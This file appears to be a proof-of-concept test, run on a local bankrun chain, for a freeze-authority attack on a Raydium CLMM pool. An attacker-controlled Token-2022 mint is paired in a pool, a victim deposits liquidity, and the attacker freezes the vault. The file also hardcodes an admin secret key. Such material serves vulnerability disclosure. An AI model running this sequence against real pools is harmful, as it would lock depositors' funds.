import * as anchor from "@coral-xyz/anchor";
import { Program } from "@coral-xyz/anchor";
import { startAnchor } from "solana-bankrun";
import { BankrunProvider } from "anchor-bankrun";
import {
  TOKEN_PROGRAM_ID,
  TOKEN_2022_PROGRAM_ID,
  MINT_SIZE,
  createInitializeMint2Instruction,
} from "@solana/spl-token";
import {
  Keypair,
  SystemProgram,
  Transaction,
  PublicKey,
} from "@solana/web3.js";
import idl from "../target/idl/raydium_clmm.json";

const ADMIN_SECRET = [222,63,238,12,143,134,142,4,161,175,48,183,228,55,162,51,74,95,237,146,26,147,77,52,54,75,28,199,42,240,0,96,35,202,64,63,172,172,171,217,58,31,133,50,107,206,250,166,98,247,161,237,96,59,107,111,178,144,88,198,240,205,45,4];

describe("freeze authority poc", () => {
  it("Step 1-6: creates mint, amm_config, pool, deposits liquidity, freezes vault", async () => {
    const context = await startAnchor(".", [], []);
    const client = context.banksClient;
    const payer = context.payer;
    const provider = new BankrunProvider(context);
    anchor.setProvider(provider);
    const program = new Program(idl as anchor.Idl, provider);
    const admin = Keypair.fromSecretKey(Uint8Array.from(ADMIN_SECRET));
    const attacker = Keypair.generate();

    const fundTx = new Transaction().add(
      SystemProgram.transfer({
        fromPubkey: payer.publicKey,
        toPubkey: admin.publicKey,
        lamports: 5_000_000_000,
      })
    );
    const [bh1] = await client.getLatestBlockhash();
    fundTx.recentBlockhash = bh1;
    fundTx.feePayer = payer.publicKey;
    fundTx.sign(payer);
    await client.processTransaction(fundTx);
    console.log("STEP 0 PASS: admin funded");

    const mint = Keypair.generate();
    const rent = await client.getRent();
    const lamports = Number(rent.minimumBalance(BigInt(MINT_SIZE)));
    const mintTx = new Transaction();
    mintTx.add(
      SystemProgram.createAccount({
        fromPubkey: payer.publicKey,
        newAccountPubkey: mint.publicKey,
        space: MINT_SIZE,
        lamports,
        programId: TOKEN_2022_PROGRAM_ID,
      }),
      createInitializeMint2Instruction(
        mint.publicKey,
        9,
        payer.publicKey,
        attacker.publicKey,
        TOKEN_2022_PROGRAM_ID
      )
    );
    const [bh2] = await client.getLatestBlockhash();
    mintTx.recentBlockhash = bh2;
    mintTx.feePayer = payer.publicKey;
    mintTx.sign(payer, mint);
    await client.processTransaction(mintTx);
    console.log("STEP 1 PASS: Token-2022 mint created with freeze_authority = attacker:", mint.publicKey.toBase58());

    const [ammConfig] = PublicKey.findProgramAddressSync(
      [Buffer.from("amm_config"), new anchor.BN(0).toArrayLike(Buffer, "be", 2)],
      program.programId
    );
    const createAmmConfigIx = await program.methods
      .createAmmConfig(0, 60, 500, 10000, 25000)
      .accounts({
        owner: admin.publicKey,
        ammConfig: ammConfig,
        systemProgram: SystemProgram.programId,
      })
      .instruction();
    const ammConfigTx = new Transaction().add(createAmmConfigIx);
    const [bh3] = await client.getLatestBlockhash();
    ammConfigTx.recentBlockhash = bh3;
    ammConfigTx.feePayer = admin.publicKey;
    ammConfigTx.sign(admin);
    await client.processTransaction(ammConfigTx);
    console.log("STEP 2 PASS: amm_config created at", ammConfig.toBase58());

    const mint2 = Keypair.generate();
    const mint2Tx = new Transaction();
    mint2Tx.add(
      SystemProgram.createAccount({
        fromPubkey: payer.publicKey,
        newAccountPubkey: mint2.publicKey,
        space: MINT_SIZE,
        lamports,
        programId: TOKEN_2022_PROGRAM_ID,
      }),
      createInitializeMint2Instruction(
        mint2.publicKey,
        9,
        payer.publicKey,
        null,
        TOKEN_2022_PROGRAM_ID
      )
    );
    const [bh4] = await client.getLatestBlockhash();
    mint2Tx.recentBlockhash = bh4;
    mint2Tx.feePayer = payer.publicKey;
    mint2Tx.sign(payer, mint2);
    await client.processTransaction(mint2Tx);
    console.log("STEP 3 PASS: second (normal) mint created:", mint2.publicKey.toBase58());

    const [tokenMint0, tokenMint1] =
      mint.publicKey.toBuffer().compare(mint2.publicKey.toBuffer()) < 0
        ? [mint.publicKey, mint2.publicKey]
        : [mint2.publicKey, mint.publicKey];

    const [poolState] = PublicKey.findProgramAddressSync(
      [Buffer.from("pool"), ammConfig.toBuffer(), tokenMint0.toBuffer(), tokenMint1.toBuffer()],
      program.programId
    );
    const [tokenVault0] = PublicKey.findProgramAddressSync(
      [Buffer.from("pool_vault"), poolState.toBuffer(), tokenMint0.toBuffer()],
      program.programId
    );
    const [tokenVault1] = PublicKey.findProgramAddressSync(
      [Buffer.from("pool_vault"), poolState.toBuffer(), tokenMint1.toBuffer()],
      program.programId
    );
    const [observationState] = PublicKey.findProgramAddressSync(
      [Buffer.from("observation"), poolState.toBuffer()],
      program.programId
    );
    const [tickArrayBitmap] = PublicKey.findProgramAddressSync(
      [Buffer.from("pool_tick_array_bitmap_extension"), poolState.toBuffer()],
      program.programId
    );

    const sqrtPriceX64 = new anchor.BN("18446744073709551616");
    const openTime = new anchor.BN(0);

    const createPoolIx = await program.methods
      .createPool(sqrtPriceX64, openTime)
      .accounts({
        poolCreator: payer.publicKey,
        ammConfig: ammConfig,
        poolState: poolState,
        tokenMint0: tokenMint0,
        tokenMint1: tokenMint1,
        tokenVault0: tokenVault0,
        tokenVault1: tokenVault1,
        observationState: observationState,
        tickArrayBitmap: tickArrayBitmap,
        tokenProgram0: TOKEN_2022_PROGRAM_ID,
        tokenProgram1: TOKEN_2022_PROGRAM_ID,
        systemProgram: SystemProgram.programId,
        rent: anchor.web3.SYSVAR_RENT_PUBKEY,
      })
      .instruction();

    const createPoolTx = new Transaction().add(createPoolIx);
    const [bh5] = await client.getLatestBlockhash();
    createPoolTx.recentBlockhash = bh5;
    createPoolTx.feePayer = payer.publicKey;
    createPoolTx.sign(payer);
    await client.processTransaction(createPoolTx);
    console.log("STEP 4 PASS: pool created with freeze-authority mint as one side:", poolState.toBase58());

    const victim = Keypair.generate();
    const fundVictimTx = new Transaction().add(
      SystemProgram.transfer({
        fromPubkey: payer.publicKey,
        toPubkey: victim.publicKey,
        lamports: 5_000_000_000,
      })
    );
    const [bh6] = await client.getLatestBlockhash();
    fundVictimTx.recentBlockhash = bh6;
    fundVictimTx.feePayer = payer.publicKey;
    fundVictimTx.sign(payer);
    await client.processTransaction(fundVictimTx);
    console.log("STEP 5a PASS: victim funded");

    const { createAssociatedTokenAccountInstruction, createMintToInstruction, getAssociatedTokenAddressSync, createFreezeAccountInstruction } = await import("@solana/spl-token");

    const victimAta0 = getAssociatedTokenAddressSync(tokenMint0, victim.publicKey, false, TOKEN_2022_PROGRAM_ID);
    const victimAta1 = getAssociatedTokenAddressSync(tokenMint1, victim.publicKey, false, TOKEN_2022_PROGRAM_ID);

    const setupVictimTokensTx = new Transaction().add(
      createAssociatedTokenAccountInstruction(payer.publicKey, victimAta0, victim.publicKey, tokenMint0, TOKEN_2022_PROGRAM_ID),
      createAssociatedTokenAccountInstruction(payer.publicKey, victimAta1, victim.publicKey, tokenMint1, TOKEN_2022_PROGRAM_ID),
      createMintToInstruction(tokenMint0, victimAta0, payer.publicKey, 1_000_000_000, [], TOKEN_2022_PROGRAM_ID),
      createMintToInstruction(tokenMint1, victimAta1, payer.publicKey, 1_000_000_000, [], TOKEN_2022_PROGRAM_ID)
    );
    const [bh7] = await client.getLatestBlockhash();
    setupVictimTokensTx.recentBlockhash = bh7;
    setupVictimTokensTx.feePayer = payer.publicKey;
    setupVictimTokensTx.sign(payer);
    await client.processTransaction(setupVictimTokensTx);
    console.log("STEP 5b PASS: victim has real token balances in both mints");

    const positionNftMint = Keypair.generate();
    const tickLower = -600;
    const tickUpper = 600;
    const tickArrayLowerStart = -3600;
    const tickArrayUpperStart = 0;

    const [protocolPosition] = PublicKey.findProgramAddressSync(
      [
        Buffer.from("position"),
        poolState.toBuffer(),
        Buffer.from(new anchor.BN(tickLower).toTwos(32).toArrayLike(Buffer, "be", 4)),
        Buffer.from(new anchor.BN(tickUpper).toTwos(32).toArrayLike(Buffer, "be", 4)),
      ],
      program.programId
    );
    const [tickArrayLower] = PublicKey.findProgramAddressSync(
      [Buffer.from("tick_array"), poolState.toBuffer(), Buffer.from(new anchor.BN(tickArrayLowerStart).toTwos(32).toArrayLike(Buffer, "be", 4))],
      program.programId
    );
    const [tickArrayUpper] = PublicKey.findProgramAddressSync(
      [Buffer.from("tick_array"), poolState.toBuffer(), Buffer.from(new anchor.BN(tickArrayUpperStart).toTwos(32).toArrayLike(Buffer, "be", 4))],
      program.programId
    );
    const [personalPosition] = PublicKey.findProgramAddressSync(
      [Buffer.from("position"), positionNftMint.publicKey.toBuffer()],
      program.programId
    );
    const positionNftAccount = getAssociatedTokenAddressSync(positionNftMint.publicKey, victim.publicKey, false, TOKEN_2022_PROGRAM_ID);

    const openPositionIx = await program.methods
      .openPositionWithToken22Nft(
        tickLower,
        tickUpper,
        tickArrayLowerStart,
        tickArrayUpperStart,
        new anchor.BN(1_000_000),
        new anchor.BN(500_000_000),
        new anchor.BN(500_000_000),
        false,
        null
      )
      .accounts({
        payer: victim.publicKey,
        positionNftOwner: victim.publicKey,
        positionNftMint: positionNftMint.publicKey,
        positionNftAccount: positionNftAccount,
        poolState: poolState,
        protocolPosition: protocolPosition,
        tickArrayLower: tickArrayLower,
        tickArrayUpper: tickArrayUpper,
        personalPosition: personalPosition,
        tokenAccount0: victimAta0,
        tokenAccount1: victimAta1,
        tokenVault0: tokenVault0,
        tokenVault1: tokenVault1,
        rent: anchor.web3.SYSVAR_RENT_PUBKEY,
        systemProgram: SystemProgram.programId,
        tokenProgram: TOKEN_PROGRAM_ID,
        associatedTokenProgram: new PublicKey("ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL"),
        tokenProgram2022: TOKEN_2022_PROGRAM_ID,
        vault0Mint: tokenMint0,
        vault1Mint: tokenMint1,
      })
      .instruction();

    const openPositionTx = new Transaction().add(openPositionIx);
    const [bh8] = await client.getLatestBlockhash();
    openPositionTx.recentBlockhash = bh8;
    openPositionTx.feePayer = victim.publicKey;
    openPositionTx.sign(victim, positionNftMint);
    await client.processTransaction(openPositionTx);
    console.log("STEP 5c PASS: victim opened a real position and deposited real liquidity into the vaults");

    // === STEP 6: attacker freezes the vault holding the malicious mint ===
    const fundAttackerTx = new Transaction().add(
      SystemProgram.transfer({
        fromPubkey: payer.publicKey,
        toPubkey: attacker.publicKey,
        lamports: 1_000_000_000,
      })
    );
    const [bhAttacker] = await client.getLatestBlockhash();
    fundAttackerTx.recentBlockhash = bhAttacker;
    fundAttackerTx.feePayer = payer.publicKey;
    fundAttackerTx.sign(payer);
    await client.processTransaction(fundAttackerTx);

    const freezeTargetVault = tokenMint0.equals(mint.publicKey) ? tokenVault0 : tokenVault1;

    const freezeIx = createFreezeAccountInstruction(
      freezeTargetVault,
      mint.publicKey,
      attacker.publicKey,
      [],
      TOKEN_2022_PROGRAM_ID
    );

    const freezeTx = new Transaction().add(freezeIx);
    const [bh9] = await client.getLatestBlockhash();
    freezeTx.recentBlockhash = bh9;
    freezeTx.feePayer = attacker.publicKey;
    freezeTx.sign(attacker);
    await client.processTransaction(freezeTx);

    console.log("STEP 6 PASS: attacker froze the pool vault:", freezeTargetVault.toBase58());
  });
});
